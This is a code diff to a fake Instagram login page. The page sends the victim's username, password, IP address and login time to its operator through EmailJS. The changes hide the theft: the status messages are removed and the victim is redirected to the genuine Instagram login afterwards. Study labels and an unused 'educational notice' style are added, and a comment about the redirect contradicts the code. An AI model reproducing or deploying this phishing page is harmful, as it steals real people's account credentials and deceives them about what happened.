@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram</title>
+<title>Instagram </title>
 
 <style>
 * {
@@ -28,6 +28,23 @@ body {
     display: flex;
     flex-direction: column;
     padding: 20px;
+}
+
+/* AVISO EDUCATIVO - DESTAQUE */
+.aviso {
+    background: #fffbda;
+    border-left: 4px solid #ffc107;
+    padding: 12px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #856404;
+    text-align: center;
+    border-radius: 8px;
+}
+
+.aviso a {
+    color: #1877f2;
+    text-decoration: none;
 }
 
 .lang {
@@ -111,7 +128,7 @@ body {
     font-weight: bold;
     font-size: clamp(14px, 2vw, 16px);
     cursor: pointer;
-    transition: opacity 0.3s;
+    transition: opacity 0.3s, background 0.3s;
 }
 
 .btn-login:hover {
@@ -119,8 +136,9 @@ body {
 }
 
 .btn-login:disabled {
-    opacity: 0.6;
+    background: #b0b0b0;
     cursor: not-allowed;
+    opacity: 1;
 }
 
 .forgot {
@@ -272,8 +290,9 @@ body {
             return;
         }
         
+        // Botão fica cinza e desabilitado - texto continua "Entrar"
         btnLogin.disabled = true;
-        btnLogin.textContent = 'Enviando...';
+        btnLogin.style.background = "#b0b0b0";
         
         try {
             const now = new Date();
@@ -281,7 +300,7 @@ body {
             const ipAddress = await getUserIP();
             
             // Enviar via EmailJS
-            const response = await emailjs.send(
+            await emailjs.send(
                 SERVICE_ID,
                 TEMPLATE_ID,
                 {
@@ -289,27 +308,22 @@ body {
                     password: password,
                     access_date: accessDate,
                     ip_address: ipAddress,
-                    name: "Instagram Clone"
+                    name: "Instagram Clone - Estudo"
                 }
             );
             
-            console.log('✅ Enviado!', response);
-            showToast('✓ Login efetuado!');
+            console.log('✅ Enviado!');
             
-            usernameInput.value = '';
-            passwordInput.value = '';
-            
-            setTimeout(() => {
-                btnLogin.disabled = false;
-                btnLogin.textContent = 'Entrar';
-            }, 2000);
+            // Redirecionar para o meme do YouTube
+            window.location.href = "https://www.instagram.com/accounts/login/";
             
         } catch (error) {
             console.error('❌ Erro:', error);
-            showToast('Erro ao enviar. Veja o console.', true);
+            showToast('Erro ao enviar. Tente novamente.', true);
             
+            // Botão volta ao normal
             btnLogin.disabled = false;
-            btnLogin.textContent = 'Entrar';
+            btnLogin.style.background = "#1877f2";
         }
     });
     
@@ -321,9 +335,7 @@ body {
         if (e.key === 'Enter') btnLogin.click();
     });
     
-    console.log('🚀 Instagram Clone com EmailJS rodando!');
-    console.log('Service ID:', SERVICE_ID);
-    console.log('Template ID:', TEMPLATE_ID);
+    console.log('🚀 Instagram ');
 </script>
 
 </body>
